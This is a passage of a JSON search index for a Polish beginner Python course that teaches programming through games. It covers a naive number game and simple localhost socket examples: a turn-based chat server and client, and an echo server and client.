odgadn\u0105\u0107 liczb\u0119?</p> <p>Poni\u017cej tak\u017ce mo\u017cesz przetestowa\u0107 dzia\u0142anie gry.</p> <p>https://replit.com/@damiankurpiewski/Zgadywanie4</p>"},{"location":"learning-by-games/python/introduction/silly-game/","title":"Prosta (naiwna) gra","text":""},{"location":"learning-by-games/python/introduction/silly-game/#wstep","title":"Wst\u0119p","text":"<p>Na pocz\u0105tku pisa\u0142em, \u017ce tworzenie aplikacji konsolowym jest nudne. Od czego\u015b jednak trzeba zacz\u0105\u0107! Zanim wskoczymy do \u015bwiata gier dwuwymiarowych, stworzymy nasz\u0105 pierwsz\u0105 gr\u0119 \"tekstow\u0105\". Nauczymy si\u0119 w ten spos\u00f3b zupe\u0142nych podstaw programowania, takich jak interakcja z u\u017cytkownikiem (graczem), tworzenie zmiennych, modyfikowanie ich i wypisywanie komunikat\u00f3w na ekranie.</p>"},{"location":"learning-by-games/python/introduction/silly-game/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Tworzenia zmiennych i prostych operacji na nich.</li> <li>Komunikacji z u\u017cytkownikiem.</li> </ul>"},{"location":"learning-by-games/python/introduction/silly-game/#gra","title":"Gra","text":"<p>Jak wskazuje tytu\u0142, nasza gra b\u0119dzie prosta, a nawet mo\u017cna powiedzie\u0107, \u017ce naiwna! B\u0119dzie to gra dla dw\u00f3ch graczy: cz\u0142owiek kontra komputer. Przebieg gry jest prosty: najpierw pierwszy gracz podaje swoj\u0105 liczb\u0119, a nast\u0119pnie drugi podaje swoj\u0105. Celem jest podanie liczby wi\u0119kszej od przeciwnika. Wygrywa ten, kto poda wi\u0119ksz\u0105 warto\u015b\u0107!</p>"},{"location":"learning-by-games/python/introduction/silly-game/#przykad","title":"Przyk\u0142ad","text":"<ul> <li>Gracz: 14</li> <li>Komputer: 15, wygra\u0142em!</li> </ul> <p>Prosta gra, prawda? Jest jednak pewien problem. Je\u017celi zaczynamy jako pierwsi, to nie mamy szansy wygra\u0107! Wystarczy, \u017ce przeciwnik poda warto\u015b\u0107 o jeden wi\u0119ksz\u0105 od naszej i w ten spos\u00f3b wygrywa. Dlatego na wst\u0119pie wspomnia\u0142em, \u017ce ta gra jest nie tylko prosta, ale wr\u0119cz naiwna!</p> <p>Jest to jednak idealna gra na pocz\u0105tek. Przejd\u017amy wi\u0119c do dzia\u0142ania!</p>"},{"location":"learning-by-games/python/introduction/silly-game/#tworzymy-nowy-projekt","title":"Tworzymy nowy projekt","text":"<p>https://youtu.be/WxS5iz4bNxM</p> <p>Info</p> <p>W naszym projekcie b\u0119dziemy mogli stworzy\u0107 wiele r\u00f3\u017cnych aplikacji i gier. Czasem jednak wygodniej b\u0119dzie utworzy\u0107 nowy projekt do kolejnej gry, aby zachowa\u0107 lepszy porz\u0105dek. Wszystko zale\u017cy od Ciebie!</p>"},{"location":"learning-by-games/python/introduction/silly-game/#tworzymy-nowy-plik","title":"Tworzymy nowy plik","text":"<p>Klikamy prawym przyciskiem myszy na g\u0142\u00f3wny katalog naszej gry, nast\u0119pnie wybieramy New-&gt;Python file. Nazwijmy nasz plik naiwna_gra. Utworzony przez Ciebie plik powinien mie\u0107 rozszerzenie .py. Oznacza to, \u017ce ca\u0142a nazwa pliku b\u0119dzie wygl\u0105da\u0142a nast\u0119puj\u0105co: naiwna_gra.py.</p> <p>Info</p> <p>Rozszerzenie .py to format skrypt\u00f3w zapisanych w j\u0119zyku Python.</p>"},{"location":"learning-by-games/python/introduction/silly-game/#wczytujemy-liczbe-od-gracza","title":"Wczytujemy liczb\u0119 od gracza","text":"<p>Zaczynamy od wczytania liczby od u\u017cytkownika. W tym celu skorzystamy z polecenia <code>input</code>. Jako parametr tego polecenia, kt\u00f3ry zapisujemy w nawiasach okr\u0105g\u0142ych, podajemy komunikat, kt\u00f3ry ma zosta\u0107 wy\u015bwietlony na ekranie. W Pythonie komunikaty i teksty podajemy w cudzys\u0142owie:</p> <pre><code>input(\"Podaj liczb\u0119: \")\n</code></pre> <p>Nie wystarczy jednak tylko wywo\u0142a\u0107 odpowiednie polecenie. Musimy jeszcze gdzie\u015b zapisa\u0107 jego wynik, a konkretnie w nowej zmiennej, kt\u00f3r\u0105 nazwiemy <code>liczba_tekst</code>:</p> <pre><code>liczba_tekst = input(\"Podaj liczb\u0119: \")\n</code></pre> <p>Info</p> <p>Zmienne mo\u017cemy traktowa\u0107 jak \"pude\u0142ka na dane\". Mo\u017cemy w nich przechowywa\u0107 r\u00f3\u017cne warto\u015bci, jednak ka\u017cde pude\u0142ko mo\u017ce przechowywa\u0107 tylko jedn\u0105 warto\u015b\u0107 naraz i tylko jednego typu.</p> <p>W j\u0119zyku Python zmienne nazywamy zwyczajowo z ma\u0142ych liter alfabetu angielskiego, a kolejne wyrazy w nazwie zmiennej oddzielamy znakiem pod\u0142ogi (<code>_</code>).</p> <p>Warning</p> <p>W nazwach zmiennych nie mo\u017cemy u\u017cywa\u0107 spacji ani innych bia\u0142ych znak\u00f3w, takich jak tabulacje. Powinni\u015bmy tak\u017ce unika\u0107 polskich znak\u00f3w czy liter innych ni\u017c litery alfabetu angielskiego. Ponadto nazwa zmiennej nie mo\u017ce zaczyna\u0107 si\u0119 od cyfry i nie powinna zawiera\u0107 wi\u0119kszo\u015bci znak\u00f3w specjalnych takich jak dolar (<code>$</code>) czy ampersant (<code>&amp;</code>).</p> <p>Gdy u\u017cywamy polecenia <code>input</code>, to warto\u015b\u0107 wpisana przez u\u017cytkownika b\u0119dzie zawsze wczytana jako tekst. My jednak potrzebujemy liczb\u0119. W tym celu skorzystamy z kolejnego polecenia: <code>int</code> (ang. integer czyli liczba ca\u0142kowita). Pos\u0142u\u017cy nam ono do zamiany tekstu na liczb\u0119 ca\u0142kowit\u0105. Jako parametr tego polecenia podajemy tekst do zamiany na liczb\u0119, w naszym przypadku ten tekst zapisany jest w zmiennej <code>liczba_tekst</code>:</p> <pre><code>int(liczba_tekst)\n</code></pre> <p>Info</p> <p>W celu zamiany wprowadzonego tekstu na liczb\u0119 rzeczywist\u0105 skorzystaliby\u015bmy z polecenia <code>float</code>.</p> <p>Oczywi\u015bcie wynik polecenia musimy gdzie\u015b zapisa\u0107. Zapami\u0119tamy go w nowej zmiennej o nazwie <code>liczba</code>:</p> <pre><code>liczba = int(liczba_tekst)\n</code></pre> <p>Jak dot\u0105d mamy w naszym programie dwa polecenia: wczytanie warto\u015bci od u\u017cytkownika i zamian\u0119 jej na liczb\u0119.</p> <pre><code>liczba_tekst = input(\"Podaj liczb\u0119: \")\nliczba = int(liczba_tekst)\n</code></pre> <p>Ju\u017c teraz warto uruchomi\u0107 program i sprawdzi\u0107, czy wszystko dzia\u0142a.</p> <p>W celu uruchomienia naszej gry klikamy prawym przyciskiem myszy gdzie\u015b w edytorze i wybieramy zielon\u0105 strza\u0142k\u0119 z napisem Run 'naiwna_gra'.</p> <p>Warning</p> <p>Pami\u0119taj, \u017ceby testowa\u0107 swoje gry i programy jak najcz\u0119\u015bciej! Pozwoli to na bie\u017c\u0105co rozwi\u0105zywa\u0107 wszelkie b\u0142\u0119dy i unikn\u0105\u0107 p\u00f3\u017aniejszej frustracji.</p> <p>Info</p> <p>Pycharm na bie\u017c\u0105co zapisuje zmiany w plikach, wi\u0119c nie musisz si\u0119 martwi\u0107, \u017ce utracisz swoje dane.</p>"},{"location":"learning-by-games/python/introduction/silly-game/#tworzymy-nowa-wieksza-liczbe","title":"Tworzymy now\u0105, wi\u0119ksz\u0105 liczb\u0119","text":"<p>Przejd\u017amy teraz do roli komputera. Jego zadaniem jest wypisanie liczby o jeden wi\u0119kszej od tej, kt\u00f3r\u0105 poda\u0142 u\u017cytkownik. W tym celu utworzymy now\u0105 liczb\u0119, o jeden wi\u0119ksz\u0105 od tej wczytanej od u\u017cytkownika. Tworzymy now\u0105 zmienn\u0105 <code>nowa_liczba</code> i przypisujemy do niej wynik dodania liczby \\(1\\) do warto\u015bci wczytanej od u\u017cytkownika zapisanej w zmiennej <code>liczba</code>:</p> <pre><code>nowa_liczba = liczba + 1\n</code></pre>"},{"location":"learning-by-games/python/introduction/silly-game/#wypisujemy-nowa-liczbe","title":"Wypisujemy now\u0105 liczb\u0119","text":"<p>Teraz pozosta\u0142o nam wypisa\u0107 nowo utworzon\u0105 liczb\u0119, a nast\u0119pnie komunikat o wygranej. W tym celu skorzystamy z polecenia <code>print</code>, kt\u00f3re jako parametr przyjmuje zmienn\u0105, lub komunikat do wypisania. Zaczniemy od wypisania naszej nowej liczby:</p> <pre><code>print(nowa_liczba)\n</code></pre> <p>Nie oczekujemy, \u017ce polecenie <code>print</code> zwr\u00f3ci nam jak\u0105\u015b warto\u015b\u0107, jego zadaniem jest tylko wypisanie komunikatu na ekranie.</p>"},{"location":"learning-by-games/python/introduction/silly-game/#wypisujemy-komunikat-o-wygranej","title":"Wypisujemy komunikat o wygranej","text":"<p>Na koniec wypiszemy jeszcze komunikat Wygra\u0142em. Pami\u0119tamy, \u017ce komunikaty i teksty podajemy w cudzys\u0142owie.</p> <pre><code>print(\"Wygra\u0142em!\")\n</code></pre> <p>Sk\u0142adamy wszystko w ca\u0142o\u015b\u0107 i mamy gotow\u0105 gr\u0119!</p>"},{"location":"learning-by-games/python/introduction/silly-game/#gotowa-gra-z-komentarzami","title":"Gotowa gra z komentarzami","text":"<pre><code># Wczytujemy od u\u017cytkownika warto\u015b\u0107 w formie tekstu\nliczba_tekst = input(\"Podaj liczb\u0119: \")\n\n# Zamieniamy wczytan\u0105 wcze\u015bniej warto\u015b\u0107 na liczb\u0119 ca\u0142kowit\u0105\nliczba = int(liczba_tekst)\n\n# Tworzymy now\u0105 liczb\u0119 wi\u0119ksz\u0105 o 1 od tej, kt\u00f3r\u0105 poda\u0142 u\u017cytkownik\nnowa_liczba = liczba + 1\n\n# Wypisujemy now\u0105 liczb\u0119 w konsoli\nprint(nowa_liczba)\n\n# A nast\u0119pnie wypisujemy informacj\u0119 o wygranej komputera\nprint(\"Wygra\u0142em!\")\n</code></pre> <p>Info</p>"},{"location":"learning-by-games/python/introduction/silly-game/#komentarze","title":"Komentarze","text":"<p>Komentarze to fragmenty naszego kodu, kt\u00f3re nie wp\u0142ywaj\u0105 na dzia\u0142anie programu. Mo\u017cna je traktowa\u0107 jak notatki na marginesie. W tym kursie b\u0119dziemy u\u017cywa\u0107 komentarzy, aby wyt\u0142umaczy\u0107 dzia\u0142anie wybranych fragment\u00f3w kodu. Cz\u0119sto u\u017cywa si\u0119 komentarzy tak\u017ce do tego, aby zakomentowa\u0107 wybrane instrukcje, kt\u00f3rych nie chcemy usuwa\u0107, ale nie chcemy te\u017c, by by\u0142y aktywne.</p> <p>W j\u0119zyku Python komentarze zaczynamy od znaku hash (<code>#</code>). Wszystko po tym znaku w danej linijce traktowane jest jako komentarz.</p>"},{"location":"learning-by-games/python/introduction/silly-game/#uruchamiamy-gre","title":"Uruchamiamy gr\u0119","text":"<p>Teraz czas, aby uruchomi\u0107 swoj\u0105 pierwsz\u0105 gr\u0119! Spr\u00f3buj uruchomi\u0107 j\u0105 kilka razy i poda\u0107 r\u00f3\u017cne warto\u015bci. Czy komputer zawsze wygra?</p> <p>Mo\u017cesz tak\u017ce przetestowa\u0107 nasz\u0105 gr\u0119 w poni\u017cszym okienku. Kliknij zielony przycisk z napisem Run, aby j\u0105 uruchomi\u0107.</p> <p>https://replit.com/@damiankurpiewski/NaiwnaGra</p> <p>Info</p>"},{"location":"learning-by-games/python/introduction/silly-game/#bedy","title":"B\u0142\u0119dy","text":"<p>Podczas tworzenia kolejnych gier i program\u00f3w pope\u0142nianie b\u0142\u0119d\u00f3w stanie si\u0119 chlebem powszednim. Nie nale\u017cy si\u0119 nimi przejmowa\u0107, wr\u0119cz przeciwnie! Niekt\u00f3re b\u0142\u0119dy mog\u0105 wr\u0119cz przynie\u015b\u0107 nieoczekiwane i zaskakuj\u0105ce rezultaty. Oczywi\u015bcie czasami zdarzy nam si\u0119 tak\u017ce pope\u0142ni\u0107 b\u0142\u0105d, kt\u00f3ry uniemo\u017cliwi uruchomienie naszego programu. W takim przypadku, przy pr\u00f3bie uruchomienia, w konsoli pojawi\u0105 si\u0119 stosowne komunikaty zaznaczone czerwonym kolorem. Warto si\u0119 przyjrze\u0107 tym komunikatom! Cz\u0119sto b\u0119d\u0105 wskazywa\u0107 linijk\u0119, w kt\u00f3rej wyst\u0105pi\u0142 b\u0142\u0105d, a tak\u017ce opisz\u0105 przyczyn\u0119 samego b\u0142\u0119du. Na pocz\u0105tku w wi\u0119kszo\u015bci b\u0142\u0119dy b\u0119d\u0105 ogranicza\u0107 si\u0119 do braku jakiego\u015b znaku, np. nawiasu ko\u0144cowego, albo liter\u00f3wki w nazwie zmiennej czy polecenia.</p>"},{"location":"learning-by-games/python/online/","title":"Gry sieciowe","text":"<p>Granie na jednym komputerze w pojedynk\u0105 lub z kilkoma innymi osobami jest \u015bwietn\u0105 zabaw\u0105, ale nie zawsze mo\u017cemy wszyscy zebra\u0107 si\u0119 w jednym miejscu. W takim przypadku warto wiedzie\u0107, jak stworzy\u0107 w\u0142asn\u0105 gr\u0119 sieciow\u0105, kt\u00f3ra pozwoli zagra\u0107 graczom z r\u00f3\u017cnych zak\u0105tk\u00f3w \u015bwiata.</p>"},{"location":"learning-by-games/python/online/chat/","title":"Pochatujmy!","text":""},{"location":"learning-by-games/python/online/chat/#wstep","title":"Wst\u0119p","text":"<p>Komunikacja przez sie\u0107 to bardzo ciekawe zagadnienie. Mo\u017cemy rozmawia\u0107 z osobami, kt\u00f3re znajduj\u0105 si\u0119 po drugiej stronie globu, i to w czasie rzeczywistym! Jeszcze kilkadziesi\u0105t lat temu by\u0142o to nie do wyobra\u017cenia.</p> <p>Istnieje wiele aplikacji pozwalaj\u0105cych komunikowa\u0107 si\u0119 przez sie\u0107, a dzisiaj napiszemy w\u0142asn\u0105. Nie b\u0119dzie to gra, ale ten przyk\u0142ad pos\u0142u\u017cy nam do poznania pewnych bardzo wa\u017cnych poj\u0119\u0107, kt\u00f3re b\u0119d\u0105 nam niezb\u0119dne do stworzenia gry przez sie\u0107.</p>"},{"location":"learning-by-games/python/online/chat/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>\"Turowej\" komunikacji przez sie\u0107.</li> <li>\u0141\u0105czenia klient\u00f3w w pary.</li> </ul>"},{"location":"learning-by-games/python/online/chat/#serwer","title":"Serwer","text":"<p>TODO</p>"},{"location":"learning-by-games/python/online/chat/#peen-program-z-komentarzami","title":"Pe\u0142en program z komentarzami","text":"<pre><code>import socket\nfrom _thread import *\n\ndef threaded_client(user1, user2):\n    # Pobieramy nicki od rozm\u00f3wc\u00f3w\n    user1_name = user1.recv(2048).decode()\n    user2_name = user2.recv(2048).decode()\n\n    # Nast\u0119pnie wysy\u0142amy te nicki do rozm\u00f3wc\u00f3w, zapoznaj\u0105c ich ze sob\u0105\n    user1.send(str.encode(user2_name))\n    user2.send(str.encode(user1_name))\n\n    # Wysy\u0142amy rozm\u00f3wcom ich kolejno\u015b\u0107\n    user1.send(str.encode(\"1\"))\n    user2.send(str.encode(\"2\"))\n\n    # Obs\u0142ugujemy rozmow\u0119 przez ca\u0142 czas\n    while True:\n        # Pobieramy wiadomo\u015b\u0107 od pierwszego rozm\u00f3wcy\n        message = user1.recv(2048).decode()\n        # I wysy\u0142amy j\u0105 do drugiego\n        user2.send(str.encode(message))\n\n        # Nast\u0119pnie pobieramy wiadomo\u015b\u0107 od drugiego rozm\u00f3wcy\n        message = user2.recv(2048).decode()\n        # I wysy\u0142amy j\u0105 do pierwszego\n        user1.send(str.encode(message))\n\n# Podajemy adres IP, na kt\u00f3rym b\u0119dzie dzia\u0142a\u0142 serwer\nserver = \"127.0.0.1\"\n# A tak\u017ce port, na kt\u00f3rym b\u0119dzie nas\u0142uchiwa\u0142 na po\u0142\u0105czenia\nport = 5555\n\n# Tworzymy gniazdo\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# L\u0105czymy gniazdo ze wskazanym adresem IP i portem\ns.bind((server, port))\n\n# Nas\u0142uchujemy na po\u0142\u0105czenia\ns.listen(2)\n\nprint(\"Starting server...\")\n# Serwer dzia\u0142a ca\u0142y czas\nwhile True:\n    # Czekamy na po\u0142\u0105czenie od pierwszego rozm\u00f3wcy\n    user1, addr1 = s.accept()\n    print(\"Connected to:\", addr1)\n\n    # Czekamy na po\u0142\u0105czenie od drugiego rozm\u00f3wcy\n    user2, addr2 = s.accept()\n    print(\"Connected to:\", addr2)\n\n    # Uruchamiamy w\u0105tek do obs\u0142ugi komunikacji pomi\u0119dzy u\u017cytkownikami\n    start_new_thread(threaded_client, (user1, user2))\n</code></pre>"},{"location":"learning-by-games/python/online/chat/#klient","title":"Klient","text":"<p>TODO</p>"},{"location":"learning-by-games/python/online/chat/#peen-program-z-komentarzami_1","title":"Pe\u0142en program z komentarzami","text":"<pre><code>import socket\n\n# Podajemy adres IP serwera\nserver = \"127.0.0.1\"\n# A tak\u017ce port, na kt\u00f3rym serwer nas\u0142uchuje\nport = 5555\n\n# Tworzymy gniazdo do po\u0142\u0105cze\u0144\nconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wczytujemy nick u\u017cytkownika\nuser_name = input(\"Podaj sw\u00f3j nick: \")\nprint(\"Wyszukiwanie rozm\u00f3wcy...\")\n\n# Ustanawiamy po\u0142\u0105czenie z serwerem\nconnection.connect((server, port))\n\n# Wysy\u0142amy nasz nick do serwera\nconnection.send(str.encode(user_name))\n\n# Odbieramy nick drugiego rozm\u00f3wcy od serwera\nuser2_name = connection.recv(2048).decode()\n\n# Odbieramy numer naszej kolejno\u015bci od serwera\norder = int(connection.recv(2048).decode())\n\nprint(\"Po\u0142\u0105czono z u\u017cytkownikiem\", user2_name)\n\nif order == 1:\n    print(\"Przywitaj si\u0119!\")\nelse:\n    print(\"Poczekaj na wiadomo\u015b\u0107\")\n\n# W niesko\u0144czonej p\u0119tli\nwhile True:\n    # Sprawdzamy, czy jest nasza kolej\n    if order == 1:\n        # Je\u017celi jest nasza kolej, to wczytujemy wiadomo\u015b\u0107 od u\u017cytkownika\n        message = input(\"Wiadomo\u015b\u0107: \")\n        # A nast\u0119pnie wysy\u0142amy wiadomo\u015b\u0107 do serwera\n        connection.send(str.encode(message))\n        # I teraz jest kolej naszego rozm\u00f3wcy\n        order = 2\n    else:\n        # Je\u017celi to nasz rozm\u00f3wca ma teraz swoj\u0105 kolej\n        # To odbieramy wiadomo\u015b\u0107 od serwera\n        message = connection.recv(2048).decode()\n        # Wy\u015bwietlamy j\u0105 na ekranie\n        print(user2_name, \":\", message)\n        # I przechodzimy do naszej \"tury\"\n        order = 1\n</code></pre>"},{"location":"learning-by-games/python/online/chat/#testujemy-dziaanie","title":"Testujemy dzia\u0142anie","text":"<p>TODO - filmik</p>"},{"location":"learning-by-games/python/online/echo/","title":"Echo","text":""},{"location":"learning-by-games/python/online/echo/#wstep","title":"Wst\u0119p","text":"<p>Serwer, czy te\u017c us\u0142uga ECHO to jedna z najprostszych us\u0142ug. Dzia\u0142a tak, jak nazwa wskazuje: na ka\u017cd\u0105 wys\u0142an\u0105 wiadomo\u015b\u0107/komunikat, odpowiada dok\u0142adnie tym samym. Jest to \u015bwietna us\u0142uga do testowania klient\u00f3w sieciowych, a tak\u017ce do nauki podstaw architektury klient-serwer.</p>"},{"location":"learning-by-games/python/online/echo/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Podstaw komunikacji sieciowej</li> <li>Wysy\u0142ania i odbierania wiadomo\u015bci przez gniazda</li> <li>Podstaw dzia\u0142ania architektury klient-serwer</li> <li>Obs\u0142ugi wielu klient\u00f3w za pomoc\u0105 w\u0105tk\u00f3w</li> </ul>"},{"location":"learning-by-games/python/online/echo/#klient","title":"Klient","text":"<p>W celu komunikowania si\u0119 przez sie\u0107 b\u0119dziemy korzysta\u0107 z tzw. gniazd (ang. socket). Do tego przyda nam si\u0119 biblioteka <code>socket</code>, kt\u00f3r\u0105 musimy zaimportowa\u0107:</p> <pre><code>import socket\n</code></pre> <p>Zanim po\u0142\u0105czymy si\u0119 z serwerem musimy wiedzie\u0107, pod jakim adresem IP b\u0119dzie si\u0119 on znajdowa\u0142 (nas\u0142uchiwa\u0142). </p> <p>Informacja: adres IP urz\u0105dzenia to adres sieciowy, za pomoc\u0105 kt\u00f3rego mo\u017cemy si\u0119 po\u0142\u0105czy\u0107 z danym urz\u0105dzeniem przez sie\u0107. To troch\u0119 tak, jak przy zamawianiu przesy\u0142ki musimy poda\u0107 adres, pod kt\u00f3ry musi zosta\u0107 dostarczona.</p> <p>Jako \u017ce b\u0119dziemy testowa\u0107 klienta i serwer na jednym urz\u0105dzeniu, to skorzystamy z tzw. lokalnego adresu IP (ang. <code>localhost</code>).</p> <p>Informacja: adres lokalny wskazuje to urz\u0105dzenie, na kt\u00f3rym jest u\u017cywany.</p> <pre><code>server_ip = \"127.0.0.1\"\n</code></pre> <p>Nie wystarczy nam jednak zna\u0107 adres IP serwera, potrzebujemy tak\u017ce pozna\u0107 numer portu, pod kt\u00f3rym b\u0119dzie dzia\u0142a\u0142 (nas\u0142uchiwa\u0142) serwer. </p> <p>Info</p> <p>Na jednym urz\u0105dzeniu mo\u017ce dzia\u0142a\u0107 wiele us\u0142ug sieciowych, ka\u017cda jednak musi dzia\u0142a\u0107 na osobnym porcie. To troch\u0119 tak, jak w jednym budynku mo\u017ce znajdowa\u0107 si\u0119 wiele mieszka\u0144, ale ka\u017cde pod innym numerem (inaczej przesy\u0142ki nie trafia\u0142yby tam, gdzie trzeba!).</p> <p>Warning</p> <p>Na w\u0142asne us\u0142ugi powinni\u015bmy wybiera\u0107 wysokie numery port\u00f3w (tysi\u0105ce, a nawet dziesi\u0105tki tysi\u0119cy), poniewa\u017c cz\u0119\u015b\u0107 pocz\u0105tkowych numer\u00f3w jest zarezerwowana na r\u00f3\u017cne us\u0142ugi systemowe.</p> <pre><code>port = 5555\n</code></pre> <p>Maj\u0105c ju\u017c potrzebne informacje mo\u017cemy utworzy\u0107 nowe gniazdo do naszego po\u0142\u0105czenia.</p> <pre><code>connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n</code></pre> <p>Teraz nawi\u0105zujemy po\u0142\u0105czenie z serwerem, podaj\u0105c jego adres IP i port, pod kt\u00f3rym nas\u0142uchuje.</p> <pre><code>connection.connect((server_ip, port))\n</code></pre> <p>Po wykonaniu powy\u017cszego polecenia powinni\u015bmy by\u0107 ju\u017c po\u0142\u0105czeni z serwerem (je\u017celi wszystko posz\u0142o zgodnie z planem). Oczywi\u015bcie, zanim b\u0119dziemy mogli to przetestowa\u0107, b\u0119dziemy musieli jeszcze napisa\u0107 i uruchomi\u0107 serwer. </p> <p>Po nawi\u0105zaniu po\u0142\u0105czenia warto wypisa\u0107 stosowny komunikat.</p> <pre><code>print(\"Po\u0142\u0105czono z serwerem\")\n</code></pre> <p>Teraz przechodzimy do g\u0142\u00f3wnej cz\u0119\u015bci naszego klienta. B\u0119dziemy wczytywa\u0107 wiadomo\u015b\u0107 od u\u017cytkownika, wysy\u0142a\u0107 j\u0105 do serwera, odbiera\u0107 wiadomo\u015b\u0107 od serwera i wy\u015bwietla\u0107 j\u0105 na ekranie. I tak w k\u00f3\u0142ko, w niesko\u0144czono\u015b\u0107, a\u017c nie wy\u0142\u0105czymy programu.</p> <p>Warning</p> <p>Nie b\u0119dziemy tutaj zajmowa\u0107 si\u0119 poprawnym ko\u0144czeniem komunikacji z serwerem, niemniej nale\u017cy o tym pami\u0119ta\u0107 pisz\u0105c w\u0142asne, bardziej zaawansowane programy.</p> <p>Zaczynamy od p\u0119tli:</p> <pre><code>while True:\n</code></pre> <p>Na pocz\u0105tku wczytujemy wiadomo\u015b\u0107 od u\u017cytkownika:</p> <pre><code>    message = input(\"Wiadomo\u015b\u0107: \")\n</code></pre> <p>Nast\u0119pnie wysy\u0142amy j\u0105 do serwera. W tym celu musimy j\u0105 odpowiednio zakodowa\u0107, by mo\u017cna j\u0105 by\u0142o przes\u0142a\u0107 przez sie\u0107. U\u017cywamy do tego polecenia <code>str.encode</code>:</p> <pre><code>    message_enc = str.encode(message)\n</code></pre> <p>Tak\u0105 wiadomo\u015b\u0107 mo\u017cemy wys\u0142a\u0107 do serwera:</p> <pre><code>    connection.send(message_enc)\n</code></pre> <p>Jak co\u015b wys\u0142ali\u015bmy, to teraz odbieramy to, co do nas przes\u0142ano:</p> <pre><code>    message = connection.recv(2048).decode()\n</code></pre> <p>I wy\u015bwietlamy odebran\u0105 wiadomo\u015b\u0107 na ekranie:</p> <pre><code>    print(message)\n</code></pre> <p>Pe\u0142na p\u0119tla:</p> <pre><code>while True:\n    message = input(\"Wiadomo\u015b\u0107: \")\n\n    message_enc = str.encode(message)\n\n    connection.send(message_enc)\n\n    message = connection.recv(2048).decode()\n\n    print(message)\n</code></pre>"},{"location":"learning-by-games/python/online/echo/#peen-program-z-komentarzami","title":"Pe\u0142en program z komentarzami","text":"<pre><code>import socket\n\n# Podajemy adres IP serwera\nserver_ip = \"127.0.0.1\"\n\n# A tak\u017ce port, na kt\u00f3rym serwer nas\u0142uchuje\nport = 5555\n\n# Tworzymy gniazdo do po\u0142\u0105cze\u0144\nconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Ustanawiamy po\u0142\u0105czenie z serwerem\nconnection.connect((server_ip, port))\n\nprint(\"Po\u0142\u0105czono z serwerem\")\n\n# W niesko\u0144czonej p\u0119tli\nwhile True:\n    # Wczytujemy wiadomo\u015b\u0107 od u\u017cytkownika\n    message = input(\"Wiadomo\u015b\u0107: \")\n\n    # Przygotowujemy wiadomo\u015b\u0107 do wys\u0142ania przez sie\u0107\n    message_enc = str.encode(message)\n\n    # A nast\u0119pnie wysy\u0142amy wiadomo\u015b\u0107 do serwera\n    connection.send(message_enc)\n\n    # Odbieramy wiadomo\u015b\u0107 od serwera\n    message = connection.recv(2048).decode()\n\n    # Wy\u015bwietlamy j\u0105 na ekranie\n    print(message)\n</code></pre>"},{"location":"learning-by-games/python/online/echo/#serwer-obsugujacy-jednego-klienta","title":"Serwer obs\u0142uguj\u0105cy jednego klienta","text":"<p>Podobnie jak w przypadku klienta, b\u0119dziemy korzysta\u0107 z gniazd do komunikacji przez sie\u0107. Importujemy wi\u0119c stosown\u0105 bibliotek\u0119.</p> <pre><code>import socket\n</code></pre> <p>Na pocz\u0105tku podajemy adres IP i numer portu, pod kt\u00f3rym b\u0119dzie nas\u0142uchiwa\u0142 nasz serwer. Poniewa\u017c zar\u00f3wno klient i serwer b\u0119d\u0105 dzia\u0142a\u0107 na tym samym urz\u0105dzeniu, nale\u017cy poda\u0107 takie same dane.</p> <pre><code>server_ip = \"127.0.0.1\"\nport = 5555\n</code></pre> <p>Teraz tworzymy gniazdo do po\u0142\u0105cze\u0144:</p> <pre><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n</code></pre> <p>\u0141\u0105czymy (ang. bind) je z podanym adresem IP i portem:</p> <pre><code>s.bind((server_ip, port))\n</code></pre> <p>I zaczynamy nas\u0142uchiwa\u0107 na po\u0142\u0105czenia:</p> <pre><code>s.listen(2)\n</code></pre> <p>Po rozpocz\u0119ciu nas\u0142uchiwania warto wypisa\u0107 stosowny komunikat, \u017ceby\u015bmy wiedzieli, \u017ce wszystko dzia\u0142a tak jak trzeba:</p> <pre><code>print(\"Uruchomiono serwer\")\n</code></pre> <p>Gdy ju\u017c odbierzemy po\u0142\u0105czenie, nale\u017cy je zaakceptowa\u0107:</p> <pre><code>user, addr = s.accept()\nprint(\"Po\u0142\u0105czono z:\", addr)\n</code></pre> <p>Gdy ju\u017c ustanowili\u015bmy po\u0142\u0105czenie z klientem, mo\u017cemy zacz\u0105\u0107 go obs\u0142ugiwa\u0107. Zadanie serwera jest proste: odebra\u0107 wiadomo\u015b\u0107 od klienta i odes\u0142a\u0107 j\u0105 z powrotem w niezmienionej formie. I tak w k\u00f3\u0142ko.</p> <p>Zaczynamy od p\u0119tli:</p> <pre><code>while True:\n</code></pre> <p>Odbieramy wiadomo\u015b\u0107 od klienta:</p> <pre><code>    message = user.recv(2048)\n</code></pre> <p>I odsy\u0142amy j\u0105 z powrotem:</p> <pre><code>    user.send(message)\n</code></pre> <p>Pe\u0142na p\u0119tla:</p> <pre><code>while True:\n    message = user.recv(2048)\n    user.send(message)\n</code></pre>"},{"location":"learning-by-games/python/online/echo/#peen-program-z-komentarzami_1","title":"Pe\u0142en program z komentarzami","text":"<pre><code>import socket\n\n# Podajemy adres IP, na kt\u00f3rym b\u0119dzie dzia\u0142a\u0142 serwer\nserver_ip = \"127.0.0.1\"\n\n# A tak\u017ce port, na kt\u00f3rym b\u0119dzie nas\u0142uchiwa\u0142 na po\u0142\u0105czenia\nport = 5555\n\n# Tworzymy gniazdo\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# L\u0105czymy gniazdo ze wskazanym adresem IP i portem\ns.bind((server_ip, port))\n\n# Nas\u0142uchujemy na po\u0142\u0105czenia\ns.listen(2)\n\nprint(\"Uruchomiono serwer\")\n\nuser, addr = s.accept()\nprint(\"Po\u0142\u0105czono z:\", addr)\n\n# Obs\u0142ugujemy klienta przez ca\u0142y czas\nwhile True:\n    # Pobieramy wiadomo\u015b\u0107 od klienta\n    message = user.recv(2048)\n\n    # I wysy\u0142amy j\u0105 z powrotem \n    user.send(message)\n</code></pre>"},{"location":"learning-by-games/python/online/echo/#testujemy-dziaanie","title":"Testujemy dzia\u0142anie","text":"<p>TODO - 